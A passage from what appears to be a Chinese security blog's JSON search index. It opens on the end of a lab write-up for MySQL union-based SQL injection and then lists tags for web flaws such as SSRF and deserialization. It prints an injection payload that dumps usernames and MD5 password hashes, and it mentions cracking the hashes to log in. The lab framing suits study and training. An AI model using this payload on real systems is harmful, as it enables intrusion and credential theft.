q获得字段名id,name,password,status ⑨查询字段值id=aaa&#39; union select 1,2,group_concat(name,0x7c,password),4 from stormgroup_member -- q获取用户名和MD5加密的passwordmozhe|356f589a7df439f6f744ff19bb8092c0,mozhe|57673e9e6b26829ba7a4b4d43e8ae8a7somd5解密得到两个密码dsan13，891185，后面一个是对的，离谱。。。登录获取key。","categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"web漏洞/sql注入/mysql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"靶场","slug":"web漏洞/sql注入/mysql注入/靶场","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"mysql注入","slug":"mysql注入","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"联合注入","slug":"联合注入","permalink":"https://redredredfish.github.io/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"},{"name":"靶场","slug":"靶场","permalink":"https://redredredfish.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"redfish"}],"categories":[{"name":"web漏洞","slug":"web漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"},{"name":"ssrf","slug":"web漏洞/ssrf","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/ssrf/"},{"name":"反序列化漏洞","slug":"web漏洞/反序列化漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"未授权访问漏洞","slug":"web漏洞/未授权访问漏洞","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"web漏洞/sql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"},{"name":"mysql注入","slug":"web漏洞/sql注入/mysql注入","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"web漏洞/sql注入/mysql注入/getshell","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/getshell/"},{"name":"靶场","slug":"web漏洞/sql注入/mysql注入/靶场","permalink":"https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://redredredfish.github.io/tags/ssrf/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"weblogic反序列化","slug":"weblogic反序列化","permalink":"https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"redis未授权访问","slug":"redis未授权访问","permalink":"https://redredredfish.github.io/tags/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"},{"name":"未授权访问漏洞","slug":"未授权访问漏洞","permalink":"https://redredredfish.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"name":"sql注入","slug":"sql注入","permalink":"https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"getshell","slug":"getshell","permalink":"https://redredredfish.github.io/tags/getshell/"},{"name":"shiro反序列化","slug":"shiro反序列化","permalink":"https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"mysql注入","slug":"mysql注入","permalink":"https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","permalink":"https://redredredfish.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"联合注入","slug":"联合注入","permalink":"https://redredredfish.github.io/tags/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"},{"name":"靶场","slug":"靶场","permalink":"https://redredredfish.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]}